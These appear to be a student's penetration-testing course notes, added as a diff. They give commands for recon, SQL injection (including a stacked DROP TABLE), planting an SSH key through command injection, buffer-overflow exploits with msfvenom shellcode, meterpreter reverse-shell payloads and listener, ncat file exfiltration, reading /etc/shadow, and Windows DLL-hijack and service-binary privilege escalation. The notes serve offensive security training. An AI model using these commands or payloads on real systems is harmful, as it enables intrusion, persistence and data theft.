@@ -1,0 +1,308 @@
+Pentesting-----------------------------------------------------------------------------------
+
+
+Reconnaissance-----------------------------------------------------------------------------------
+ - Hyper-Text Markup Language (HTML)
+    - Client-side interpretation
+    - Utilizes elements
+    - Typically redirects to another page for server-side interaction
+    - Cascading Styleshettes (CSS) for page themeing
+ - HTML Scraping script
+"
+  1 #!/usr/bin/python
+  2 
+  3 ##Imports
+  4 import lxml.html
+  5 import requests
+  6 
+  7 #### Grabs the webpage ####
+  8 page = requests.get('http://quotes.toscrape.com')
+  9 ### 127.0.0.1:portnumber or 0.0.0.0:portnumber
+ 10 tree = lxml.html.fromstring(page.content)
+ 11 
+ 12 ### Outlines the tag you want to grab ###
+ 13 #change //small[..] to whatver tag, leave /text() as is
+ 14 results = tree.xpath('//a[@class="tag"]/text()')
+ 15 
+ 16 ### Print it out ###
+ 17 print ('Authors: ',results)
+"
+ - making changes to line 14 changes what you grab
+ 
+ - Scanning
+    - Pingsweep
+       - for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &);done
+    - nmap scan for open ports
+       - nmap -Pn -T4 10.50.37.95 -p22,80,8080,8888,2222,4444
+       - Useful scripts
+          - banner.nse
+          - http-enum.nse
+          - smb-os-discovery.nse       
+    - banner grab open ports
+       - enum service running
+    
+
+Exploit Research-----------------------------------------------------------------------------------
+
+
+Web Exploitation-----------------------------------------------------------------------------------
+ - Various tools to view
+    - tcpdump
+    - wireshark
+    - Developer Console
+ - Fields
+    - User-Agent
+    - Referer
+    - Cookie
+    - Date
+    - Server
+    - Set-Cookie
+- SQL Injection
+   - Standard Commands (all commands end with a ';'
+      - Select = extracts data from a database
+      - Union = Used to combine the result-set of two or more select statements
+      - Use = select the database to use
+      - Update = updates data in a database
+      - Delete = Deletes data from a database
+      - Insert Into = Inserts new data into a database
+      - Create Database = creates a database
+      - Alter Database = Modifies a database
+      - Create table = Creates a new table
+      - Alter table = Modifies a table
+      - Drop table = Deletes a table
+      - Create index = Creates an index (search key)
+      - Drop index = Deletes an index
+      
+   - SQL by the numbers (MySQL)
+      - Browse website to find 
+      
+      - Find the number of columns (union select 1,2,3)
+      - Golden Statement = (union select table_schema,table_name,column_name from information_schema.columns)
+         - 1 table_schema
+         - 2 table_name
+         - 3 column_name
+      - Navigate to custom database(union select id,pass,name from session.user)
+   - Stacking Statements
+      - chaining multiple statements together using a semi-colon ';'
+      - select * from user where id='Johnny';DROP TABLE Customers; --'
+      
+- How to send ssh public key using command injection
+    - find the users home directory (user you have control over)
+    - generate your rsa key (ssh-keygen -t rsa -b 4096)
+    - cat .ssh/id_rsa.pub
+    - copy all contents except the username@box
+    - return to command injecton location
+    - execute (;mkdir .ssh) make sure to specify absolute path
+    - execute (;ls -la) to verify the directory was created
+    - execute (;echo "copied rsa" > /var/www/.ssh/authorized_keys)
+    - execute (;cat /var/www/.ssh/authorized_keys) to verify your key was added
+    - when sshing to the box after this execute (ssh -i .ssh/id_rsa username@tgtip)    
+    
+    
+Reverse Engineering-----------------------------------------------------------------------------------
+
+
+Exploit Development Testing-----------------------------------------------------------------------------------
+ - Demo
+    - gdb func
+    - analyze for vulnerabilities (pdisass main)
+    - run - executes the program
+    - Look at the EIP
+    - Utilize wiremask.eu to figure out the offset of the EIP
+    - build a python script to match the eip
+    - run <<< $(python /home/student/secutiry/demoexploit.py)
+    - the triple carrot is only used when user input is needed.
+      If it requires a parameter the triple carrots are not needed.
+    - The program will have a lot of empty overhead
+    - Process to verify that we can jmp to the top of the pointer
+       - Looking for valid jmp esp
+       - run "env - gdb" to run gdb without peda
+       - show env
+       - clear out whatever is in there
+       - show env (verify it's clear)
+       - file "target file name"
+       - run
+       - info proc map
+       - look for a valid jmp esp
+       - find /b (start addr from right below heap), (end addr from right above the stack), 0xff(jmp), 0xe4(esp)
+       - go to the middle of the output and grab a handul of the address 
+       - copy the address to python script in a multiline comment
+       - comment out old eip
+       - create new eip with one of the copied addresses
+       - reverse the byte order of the address to change it to little endian
+       - put in a nop sled to give the shellcode a landing pad
+       - create an msfvenom payload "msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python"
+       - the output will be the shellcode, copy from the output(buf to buf) and copy to the python script
+       - ensure the print statement is good to go
+       - start testing
+       - if doesn't work change the nop and try again
+       - change the payload and try again
+       - change the eip
+ - Windows
+    - Using a windows machine execute payload
+       - use netstat -anop tcp to see what port(s) it opened 
+    - Create a socket from a linux box to connect with the server
+    - Modify the socket code to interact with the server
+    - depending on the output fuzzing may be necessary to determine where it crashes
+    - Using the fuzz_results.csv file you can view what command crashed the program
+    - Input the .exe to Immunity to verify it crashes
+    - Using ruby pattern_create.rb -l or wiremask.eu build a buffer to find the offset
+    - Use the eip to determine the offset
+    - Verify you have full control by sending the offset amount of 'A's and then 4 'B's
+    - Once that has been verified we need to find all the 'bad' characters 
+       - We can do this by using "!mona bytearray" on the immunity program
+    - We need to find a jmp address now
+       - using immunity enter "!mona jmp -r ESP -m "*.dll"(corresponding dll)
+       - make sure when you input the eip it is little endian
+    - Build a payload
+       - depending on the OS
+          - msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.138 lport=1234 -b "\x00" -f python
+    - metasploit
+       - use multi/handler
+       - set payload windows/meterpreter/reverse_tcp
+       - set lhost
+       - set lport
+       - exploit
+    - can also use msfvenom -p windows/shell/reverse_tcp
+    - can also use msfvenom -p windows/shell_reverse_tcp
+
+Post Exploitation-----------------------------------------------------------------------------------
+    - Command demo Linux 
+       - cat /etc/passwd
+          - username:hashed password:userid:group userid:comments:homedir:default shell
+       - cat /etc/shadow
+          - contains encrypted user password
+       - last
+          - displays information about the last user to logon
+       - who
+          - displays who is currently logged on
+       - whoami
+          - shows who you are currently logged in as
+       - groups
+          - displays what groups the user is part of
+       - id
+          - pulls up uid,guid,and groups for the user who ran the command
+       - ps -elf
+          - displays current running processes in long format
+          - -aux
+             - gives us the process tree
+       - pstree
+          - gives the process listing in a tree format
+       - sudo lsof
+          - list of open files on the system
+       - chkconfig
+          - SysV
+       - systemctl list-units --type=service
+          - SystemD service listings
+          - adding a "| grep running" will list only running services
+       - ifconfig -a
+          - same as ip a but a little bit easier to read
+       - netstat
+          - list connections to a machine
+       - arp -an
+          - allows us to view the arp cache
+       - ip route
+          - gives us our routing table
+          - route
+             - does the same thing
+          - netstat -r
+             - does the same thing
+       - cat /proc/cpuinfo
+          - gives us information about the cpu
+       - lsmod
+          - lists kernel modules
+       - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+          - shifts the characters in the file and saves it to a different file
+       - cat file | base64
+          - converts the file to base64 encryption
+       - scp <source> <destination>
+       - ncat --ssl <ip> <port> < <file>
+    - Command demo Windows
+       - net user
+          - Shows users on the box
+       - get-localuser
+          - Shows users on the box PS
+       - get-localgroup
+          - Shows all the groups on the box PS
+       - get-localuser | get-member
+          - shows what we can do with the output with select PS
+       - tasklist /v
+          - shows running processes
+       - get-process
+          - shows running processes PS
+       - get-process | where {$_.sessionid -eq 1}
+       - tasklist /svc
+          - shows services
+       - get-service | where {$_.status -eq "running"}
+          - shows services that are running PS
+       - net start
+          - shows startup services
+       - wmic service list status
+          - running services CMD
+       - ipconfig /all
+          - view info about the NICs
+       - netstat -anob
+          - all listening ports
+       - wmic net use list
+          - CMD
+       - net view
+          - CMD
+       - arp -a
+          - displays the ARP cache
+       - route print
+          - prints the routing table
+       - systeminfo
+          - gives a lot of info about the box
+       - date
+          - allows us to enumerate where the pc is
+       - obfuscation
+          - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c', 'd'} > translated.out
+          - certutil -encode <file> encoded.b64
+
+Windows Exploitation-----------------------------------------------------------------------------------
+   - Demo: DLL Hijacking
+      - Identify Vulnerability
+      - Validate permissions
+      - Validate executable paths
+      - Replace with malicous file
+   - schtasks /query /fo LIST /v
+   - schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+   - C:\Users\student\exercise_2\putty.exe
+   - Run: sigcheck c:\users\student\exercise_2\putty.exe
+   - Run: icacls "c:\users\student\exercise_2"
+   - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WIMM.dll
+   - Transfer the DLL to the target machine using one of the following methods:
+      - scp the dll from linux to target machine
+   - Put the retrieved DLL in the same location as the vulnerable Putty executable
+      - Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"
+   - Allow for Putty to execute with scheduled task
+- Vulnerable services
+   - Find vulnerable services
+      - wmic service list full
+      - services.msc
+      - sc.exe qc <service name>
+      - for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST^|findstr /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+   - Check permissions
+      - icacls "C:\Program Files\7-Zip\"
+      - icacls "C:\Program Files\7-Zip\7z.exe"
+   - Identify and document the service information associated with the path
+      - From CMD: wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | finstr /i "7z.exe"
+         - path: C:\Program Files\7-Zip\
+         - service name: testservice2
+   - Exploiting the service
+      - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+      - create a backup of the 7z.exe file on the target system
+      - replace the original 7z.exe with the malicous 7z.exe
+         - if using a reverse shell payload setup a netcat listener
+         - start the service
+         - verify it's running
+         - tasklist /FI "IMAGENAME eq 7z.exe"
+         
+ - Persistance locations
+    - Sch tasks
+    - Run keys (HKLM/HKU)
+    - psprofiles
+
+Linux Exploitation-----------------------------------------------------------------------------------
+
+
